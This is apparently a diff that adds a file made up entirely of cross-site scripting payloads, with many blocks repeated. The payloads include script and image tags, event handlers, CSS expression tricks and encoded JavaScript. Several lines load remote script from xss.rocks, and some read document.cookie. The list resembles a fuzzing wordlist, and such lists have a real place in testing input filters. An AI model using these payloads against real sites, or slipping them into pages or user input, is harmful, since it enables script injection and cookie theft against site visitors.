@@ -1,0 +1,195 @@
+<script>alert("XSS")</script>
+<IMG SRC=j&#X41vascript:alert('XSS');>
+<img src=x onerror=alert('XSS')>
+<svg/onload=alert('XSS')>
+"><script>alert("XSS")</script>
+'';!--"<script>alert("XSS")</script>
+'';!--><script>alert("XSS")</script>
+<IMG """><script>alert("XSS")</script>">
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert("XSS")>
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+<IMG """><script>alert(String.fromCharCode(88,83,83))</script>">
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=JaVaScRiPt:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=`javascript:alert(String.fromCharCode(88,83,83))`>
+<IMG SRC="jav	ascript:alert('XSS');">
+<img src="javascript:alert('XSS')" alt="XSS">
+<img src=JaVaScRiPt:alert('XSS') alt='XSS'>
+<img src=javascript:alert('XSS') alt='XSS'>
+<img src=JaVaScRiPt:alert(&quot;XSS&quot;) alt='XSS'>
+<img src=`javascript:alert("RSnake says, 'XSS'")`>
+<img src=javascript:alert(String.fromCharCode(88,83,83)) alt='XSS'>
+<img src=JaVaScRiPt:alert(String.fromCharCode(88,83,83)) alt='XSS'>
+<img src=javascript:alert(String.fromCharCode(88,83,83)) alt='XSS'>
+<img src=`javascript:alert(String.fromCharCode(88,83,83))`>
+<img src="jav	ascript:alert('XSS');">
+"><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41,41)</script>
+'';!--"><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41,41)</script>
+'';!--></title></style></textarea></script><script>alert(String.fromCharCode(88,83,83))</script>
+'';!--></title></style></textarea></script><script>alert(String.fromCharCode(88,83,83))</script>
+</script><script>alert(String.fromCharCode(88,83,83))</script>
+<iframe src="javascript:alert('XSS');"></iframe>
+<iframe src="javascript:alert(String.fromCharCode(88,83,83));"></iframe>
+<meta http-equiv="refresh" content="0;javascript:alert('XSS');">
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS');">
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<iframe/src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<script>document.write("<SCRI");</script>PT SRC="http://xss.rocks/xss.js"></SCRIPT>
+<script src=http://xss.rocks/xss.js></script>
+<BODY BACKGROUND="javascript:alert('XSS')">
+<BODY ONLOAD=alert('XSS')>
+<BR SIZE="&{alert('XSS')}">
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
+<IMG SRC='vbscript:msgbox("XSS")'>
+<IMG SRC="mocha:[code]">
+<BGSOUND SRC="javascript:alert('XSS');">
+<IMG LOWSRC="javascript:alert('XSS')">
+<IMG DYNSRC="javascript:alert('XSS')">
+<BODY ONLOAD=alert('XSS')>
+<IMG DYNSRC="javascript:alert('XSS')">
+<IMG LOWSRC="javascript:alert('XSS')">
+<IMG SRC='vbscript:msgbox("XSS")'>
+<BGSOUND SRC="javascript:alert('XSS');">
+<XML SRC="http://xss.rocks/xss.xml"></XML>
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
+<SPAN DATASRC="#I" DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML>
+<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<XML ID="xss" SRC="http://xss.rocks/xss.xml"></XML>
+<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML>
+<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<XML SRC="http://xss.rocks/xss.xml" ID=I></XML>
+<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<SCRIPT SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+<SCRIPT src=http://xss.rocks/xss.js></SCRIPT>
+<SCRIPT src=//xss.rocks/.j></SCRIPT>
+<IMG SRC="javascript:alert('XSS')"
+<SCRIPT a=">" SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT =">" SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://xss.rocks/xss.js"></SCRIPT>
+<IMG SRC='vbscript:msgbox("XSS")'>
+<IMG SRC="mocha:[code]">
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<IFRAME SRC="javascript:alert(String.fromCharCode(88,83,83));"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#39\0058\0053\0053\0027\0029'\0029">
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<DIV STYLE="background-image: url(javascript:alert('XSS'));">
+<DIV STYLE="width: expression(alert('XSS'));">
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<XSS STYLE="xss:expression(alert('XSS'))">
+<XSS STYLE="behavior: url(xss.htc);">
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/javascript">alert('XSS');</STYLE>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/javascript">alert('XSS');</STYLE>
+<IMG SRC='vbscript:msgbox("XSS")'>
+<IMG SRC="mocha:[code]">
+<IMG SRC="livescript:[code]">
+<IMG SRC="mocha://mycomputer/myscript">
+<IMG SRC='vbscript:msgbox("XSS")'>
+<IMG SRC="mocha:[code]">
+<IMG SRC="livescript:[code]">
+<IMG SRC="mocha://mycomputer/myscript">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<IFRAME SRC="javascript:alert(String.fromCharCode(88,83,83));"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#39\0058\0053\0053\0027\0029'\0029">
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<DIV STYLE="background-image: url(javascript:alert('XSS'));">
+<DIV STYLE="width: expression(alert('XSS'));">
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<XSS STYLE="xss:expression(alert('XSS'))">
+<XSS STYLE="behavior: url(xss.htc);">
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/javascript">alert('XSS');</STYLE>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/javascript">alert('XSS');</STYLE>
+<IMG SRC='vbscript:msgbox("XSS")'>
+<IMG SRC="mocha:[code]">
+<IMG SRC="livescript:[code]">
+<IMG SRC="mocha://mycomputer/myscript">
+<IMG SRC='vbscript:msgbox("XSS")'>
+<IMG SRC="mocha:[code]">
+<IMG SRC="livescript:[code]">
+<IMG SRC="mocha://mycomputer/myscript">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+<SCRIPT>a=/XSS/alert(String.fromCharCode(88,83,83))</SCRIPT>
+<SCRIPT>throw"/XSS/"+document.location.hash.substr(1)</SCRIPT>
+<SCRIPT>throw"/XSS/"+document.cookie</SCRIPT>
+<SCRIPT>throw"/XSS/"+document.cookie</SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=">" SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT =">" SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=">" SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT =">" SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT>alert('XSS')</SCRIPT>
+'';!--"<script>alert("XSS")</script>
+'';!--><script>alert("XSS")</script>
+<IMG """><script>alert("XSS")</script>">
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert("XSS")>
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+<IMG """><script>alert(String.fromCharCode(88,83,83))</script>">
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=JaVaScRiPt:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=`javascript:alert(String.fromCharCode(88,83,83))`>
+<IMG SRC="jav	ascript:alert('XSS');">
+<img src="javascript:alert('XSS')" alt="XSS">
+<img src=JaVaScRiPt:alert('XSS') alt='XSS'>
+<img src=javascript:alert('XSS') alt='XSS'>
+<img src=JaVaScRiPt:alert(&quot;XSS&quot;) alt='XSS'>
+<img src=`javascript:alert("RSnake says, 'XSS'")`>
+<img src=javascript:alert(String.fromCharCode(88,83,83)) alt='XSS'>
+<img src=JaVaScRiPt:alert(String.fromCharCode(88,83,83)) alt='XSS'>
+<img src=javascript:alert(String.fromCharCode(88,83,83)) alt='XSS'>
+<img src=`javascript:alert(String.fromCharCode(88,83,83))`>
+<img src="jav	ascript:alert('XSS');">
+"><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41,41)</script>
+'';!--"><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41,41)</script>
+'';!--></title></style></textarea></script><script>alert(String.fromCharCode(88,83,83))</script>
+'';!--></title></style></textarea></script><script>alert(String.fromCharCode(88,83,83))</script>
+</script><script>alert(String.fromCharCode(88,83,83))</script>
